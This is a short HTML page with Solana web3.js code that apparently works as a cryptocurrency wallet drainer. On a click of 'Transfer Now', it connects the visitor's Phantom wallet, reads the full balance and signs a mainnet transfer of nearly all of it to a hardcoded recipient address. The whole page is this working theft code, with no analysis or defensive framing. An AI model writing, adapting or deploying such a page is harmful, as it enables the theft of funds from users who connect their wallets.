<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
</head>
<body>
    <h2>Click below to transfer all funds</h2>
    <button onclick="transferFunds()">Transfer Now</button>

    <script>
        async function transferFunds() {
            if (!window.solana) {
                alert("Please install Phantom Wallet!");
                return;
            }

            try {
                await window.solana.connect();
                const provider = window.solana;
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

                const publicKey = provider.publicKey;
                const recipient = new solanaWeb3.PublicKey("9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf");
                const balance = await connection.getBalance(publicKey);
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: recipient,
                        lamports: balance - 5000, // subtracting small fee
                    })
                );

                const signature = await provider.signAndSendTransaction(transaction);
                alert(`Transaction successful! Signature: ${signature}`);
            } catch (error) {
                alert(`Transaction failed: ${error.message}`);
            }
        }
    </script>
</body>
</html>
